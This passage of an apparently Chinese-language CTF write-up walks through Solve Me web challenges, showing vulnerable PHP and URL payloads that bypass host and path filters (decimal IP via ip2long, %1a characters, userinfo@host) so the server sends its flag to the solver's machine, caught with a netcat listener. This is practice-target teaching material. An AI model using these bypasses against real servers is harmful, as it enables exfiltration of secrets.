class="keyword">die</span>(<span class="string">'Not allowed host'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/\/plz_give_me$/'</span>, $parse[<span class="string">'path'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">        <span class="keyword">if</span>($socket === <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Failed to create socket'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $host = gethostbyname($parse[<span class="string">'host'</span>]);</span><br><span class="line">        $port = is_null($parse[<span class="string">'port'</span>]) ? <span class="number">80</span> : $parse[<span class="string">'port'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(socket_connect($socket, $host, $port) === <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Failed to connect'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $send = <span class="string">"HEAD /"</span>.$flag.<span class="string">" HTTP/1.1\r\n"</span>.</span><br><span class="line">            <span class="string">"Host: "</span>.$host.<span class="string">":"</span>.$port.<span class="string">"\r\n"</span>.</span><br><span class="line">            <span class="string">"Connection: Close\r\n"</span>.</span><br><span class="line">            <span class="string">"\r\n\r\n"</span>;</span><br><span class="line">        socket_write($socket, $send, strlen($send));</span><br><span class="line"></span><br><span class="line">        $recv = socket_read($socket, <span class="number">1024</span>);var_dump($recv);</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^HTTP\/1.1 200 OK\r\n/'</span>, $recv))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed response'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        socket_close($socket);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Okay, I sent the flag.'</span>, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>跟上面一题类似，只是对于host有了过滤，这里我们用 <code>ip2long()</code> 函数将网络地址转化为数字地址，这样就可以绕过.的ip过滤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> ip2long(<span class="string">"120.78.164.84"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>Payload ：<br><code>givemealink2.solveme.peng.kr?url=http://2018419796:8080/plz%1agive%1ame</code><br>然后在服务器上面开监听</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8080</span><br></pre></td></tr></table></figure><p>就可以接收到返回的flag</p><h3 id="Give-me-a-link"><a href="#Give-me-a-link" class="headerlink" title="Give me a link"></a>Give me a link</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/_|\s|\0/'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed character'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?\:\/\/'</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/i'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed URL'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parse = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span>($parse[<span class="string">'path'</span>] !== <span class="string">'/plz_give_me'</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $parse[<span class="string">'scheme'</span>].<span class="string">'://'</span>.$parse[<span class="string">'host'</span>].<span class="string">'/'</span>.$flag);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">        curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Okay, I sent the flag.'</span>, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这里发现这段代码的逻辑是用get方法接受一个参数url，而这个参数要经过三次的检测，第一次会把含有下划线，空白字符过滤掉，第二次过滤检验的是是否满足url的格式，而且必须含有<code>$_SERVER[&#39;HTTP_HOST&#39;]</code>里面的内容也就是<code>http://givemealink.solveme.peng.kr/</code>，而第三次则判断路径下是否含有<code>plz_give_me</code>这个字段，突然发现这个东西跟第一个过滤下划线的自相矛盾，查一下PHP文档，问题出现在parse_url这个函数里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url</span><br><span class="line"></span><br><span class="line">    The URL to parse. Invalid characters are replaced by _.</span><br></pre></td></tr></table></figure><p>非法字符在这个函数下会自动替换成下划线，测试一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $url = urldecode(<span class="string">"http://0verwatch.top/%1atest%1a.php"</span>);</span><br><span class="line">   var_dump(parse_url($url));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"http"</span></span><br><span class="line">  [<span class="string">"host"</span>]=&gt;</span><br><span class="line">  string(<span class="number">13</span>) <span class="string">"0verwatch.top"</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  string(<span class="number">11</span>) <span class="string">"/_test_.php"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现这时候就可以利用这一点成功绕过第一个过滤，以及满足第三个过滤<br>这时候考虑第二个过滤，继续查看parse_url这个函数文档你会发现他有这样一个例子，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">'http://username:password@hostname:9090/path?arg=value#anchor'</span>;</span><br><span class="line"></span><br><span class="line">var_dump(parse_url($url));</span><br></pre></td></tr></table></figure></p><p>这也是url的一种写法，现在感觉很少用在http服务上感觉在ssh连接自己的服务器上面用的多，因为一般的url都是这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol :// hostname[:port] / path / [;parameters][?query]#fragment</span><br></pre></td></tr></table></figure></p><p>但是平常我们连接自己服务器的时候可以这样<code>ssh root@vps_ip</code> 然后输入密码，这应该也是这种类型的<br><a href="https://imgchr.com/i/P28fJO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P28fJO.md.png" alt="P28fJO.md.png"></a></p><p>然后这里的话相当于username还有password没有任何实际作用，纯粹就是用来写那个$_SERVER[‘HTTP_HOST’]来进行绕过的<br>payload：<code>http://givemealink.solveme.peng.kr?url=givemealink.solveme.peng.kr@vps_ip/plz%1agive%1ame</code><br>我们再测试一下，结果完全符合我们绕过的要求<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"http"</span></span><br><span class="line">  [<span class="string">"host"</span>]=&gt;</span><br><span class="line">  string(<span class="number">13</span>) <span class="string">"120.78.164.84"</span></span><br><span class="line">  [<span class="string">"user"</span>]=&gt;</span><br><span class="line">  string(<span class="number">59</span>) <span class="string">"givemealink.solveme.peng.kr?url=givemealink.solveme.peng.kr"</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  string(<span class="number">12</span>) <span class="string">"/plz_give_me"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后就利用那一个<code>curl_setopt</code>函数往我们这边服务器发送flag了，vps这边监听80端口,出现flag</p><h3 id="Hell-JS"><a href="#Hell-JS" class="headerlink" title="Hell JS"></a>Hell JS</h3><p>点开发现存在一大堆Js混淆代码，解码一看发现有一堆数字很可疑<br><a href="https://imgchr.com/i/P28IQH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P28IQH.md.png" alt="P28IQH.md.png"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;4&quot;+&quot;7&quot;,&quot;4&quot;+&quot;7&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;111&quot;,&quot;111&quot;,&quot;100&quot;,&quot;3&quot;+&quot;2&quot;,&quot;106&quot;,&quot;111&quot;,&quot;98&quot;,&quot;3&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;108&quot;,&quot;101&quot;,&quot;116&quot;,&quot;3&quot;+&quot;2&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;112&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;111&quot;,&quot;1&quot;+&quot;0&quot;+&quot;9&quot;,&quot;112&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;119&quot;,&quot;1&quot;+&quot;0&quot;+&quot;4&quot;,&quot;97&quot;,&quot;116&quot;,&quot;3&quot;+&quot;2&quot;,&quot;105&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;3&quot;+&quot;2&quot;,&quot;116&quot;,&quot;1&quot;+&quot;0&quot;+&quot;4&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;6&quot;+&quot;3&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;105&quot;,&quot;102&quot;,&quot;3&quot;+&quot;2&quot;,&quot;40&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;61&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;34&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;112&quot;,&quot;108&quot;,&quot;110&quot;,&quot;112&quot;,&quot;1&quot;+&quot;1&quot;+&quot;7&quot;,&quot;116&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;,&quot;3&quot;+&quot;2&quot;,&quot;101&quot;,&quot;108&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;105&quot;,&quot;102&quot;,&quot;3&quot;+&quot;2&quot;,&quot;40&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;61&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;34&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;5&quot;+&quot;0&quot;,&quot;4&quot;+&quot;9&quot;,&quot;100&quot;,&quot;102&quot;,&quot;5&quot;+&quot;2&quot;,&quot;97&quot;,&quot;100&quot;,&quot;5&quot;+&quot;1&quot;,&quot;99&quot;,&quot;101&quot;,&quot;5&quot;+&quot;1&quot;,&quot;4&quot;+&quot;9&quot;,&quot;97&quot;,&quot;102&quot;,&quot;5&quot;+&quot;6&quot;,&quot;5&quot;+&quot;2&quot;,&quot;5&quot;+&quot;3&quot;,&quot;99&quot;,&quot;102&quot;,&quot;57&quot;,&quot;99&quot;,&quot;100&quot;,&quot;5&quot;+&quot;4&quot;,&quot;97&quot;,&quot;5&quot;+&quot;3&quot;,&quot;101&quot;,&quot;100&quot;,&quot;100&quot;,&quot;98&quot;,&quot;98&quot;,&quot;57&quot;,&quot;4&quot;+&quot;9&quot;,&quot;125&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;98&quot;,&quot;105&quot;,&quot;1&quot;+&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;111&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;,&quot;3&quot;+&quot;2&quot;,&quot;101&quot;,&quot;108&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;119&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;111&quot;,&quot;1&quot;+&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;</span><br></pre></td></tr></table></figure></p><p>写个小脚本解一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dit = [<span class="string">"4"</span>+<span class="string">"7"</span>,<span class="string">"4"</span>+<span class="string">"7"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"111"</span>,<span class="string">"111"</span>,<span class="string">"100"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"106"</span>,<span class="string">"111"</span>,<span class="string">"98"</span>,<span class="string">"3"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"116"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"61"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"112"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"111"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"9"</span>,<span class="string">"112"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"119"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"4"</span>,<span class="string">"97"</span>,<span class="string">"116"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"105"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"5"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"116"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"4"</span>,<span class="string">"101"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"6"</span>+<span class="string">"3"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"105"</span>,<span class="string">"102"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"40"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"34"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"112"</span>,<span class="string">"108"</span>,<span class="string">"110"</span>,<span class="string">"112"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"7"</span>,<span class="string">"116"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"125"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"101"</span>,<span class="string">"108"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"5"</span>,<span class="string">"101"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"105"</span>,<span class="string">"102"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"40"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"34"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"5"</span>+<span class="string">"0"</span>,<span class="string">"4"</span>+<span class="string">"9"</span>,<span class="string">"100"</span>,<span class="string">"102"</span>,<span class="string">"5"</span>+<span class="string">"2"</span>,<span class="string">"97"</span>,<span class="string">"100"</span>,<span class="string">"5"</span>+<span class="string">"1"</span>,<span class="string">"99"</span>,<span class="string">"101"</span>,<span class="string">"5"</span>+<span class="string">"1"</span>,<span class="string">"4"</span>+<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"102"</span>,<span class="string">"5"</span>+<span class="string">"6"</span>,<span class="string">"5"</span>+<span class="string">"2"</span>,<span class="string">"5"</span>+<span class="string">"3"</span>,<span class="string">"99"</span>,<span class="string">"102"</span>,<span class="string">"57"</span>,<span class="string">"99"</span>,<span class="string">"100"</span>,<span class="string">"5"</span>+<span class="string">"4"</span>,<span class="string">"97"</span>,<span class="string">"5"</span>+<span class="string">"3"</span>,<span class="string">"101"</span>,<span class="string">"100"</span>,<span class="string">"100"</span>,<span class="string">"98"</span>,<span class="string">"98"</span>,<span class="string">"57"</span>,<span class="string">"4"</span>+<span class="string">"9"</span>,<span class="string">"125"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"98"</span>,<span class="string">"105"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"111"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"125"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"101"</span>,<span class="string">"108"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"5"</span>,<span class="string">"101"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"119"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"111"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"125"</span></span><br><span class="line">]</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dit:</span><br><span class="line">s = s + chr(int(i))</span><br></pre></td></tr></table></figure><p>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// good job!</span><br><span class="line"></span><br><span class="line">let flag = prompt(&quot;what is the flag?&quot;);</span><br><span class="line"></span><br><span class="line">if (flag === &quot;&quot;) &#123;</span><br><span class="line"></span><br><span class="line">alert(&quot;plnput&quot;);</span><br><span class="line"></span><br><span class="line">&#125; else if (flag === &quot;flag&#123;21df4ad3ce31af845cf9cd6a5eddbb91&#125;&quot;) &#123;</span><br><span class="line"></span><br><span class="line">alert(&quot;bingo&quot;);</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">alert(&quot;wrong&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="AntiSQL"><a href="#AntiSQL" class="headerlink" title="AntiSQL"></a>AntiSQL</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// It's 'Anti SQLi' problem of 'Solve Me'.</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>; </span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $pw = $_GET[<span class="string">'pw'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($id, $pw))&#123;</span><br><span class="line">        preg_match(</span><br><span class="line">            <span class="string">'/\.|\`|"|\'|\\|\xA0|\x0B|0x0C|\t|\r|\n|\0|'</span>.</span><br><span class="line">            <span class="string">'=|&lt;|&gt;|\(|\)|@@|\|\||&amp;&amp;|#|\/\*.*\*\/|--[\s\xA0]|'</span>.</span><br><span class="line">            <span class="string">'0x[0-9a-f]+|0b[01]+|x\'[0-9a-f]+\'|b\'[01]+\'|'</span>.</span><br><span class="line">            <span class="string">'[\s\xA0\'"]+(as|or|and|r*like|regexp)[\s\xA0\'"]+|'</span>.</span><br><span 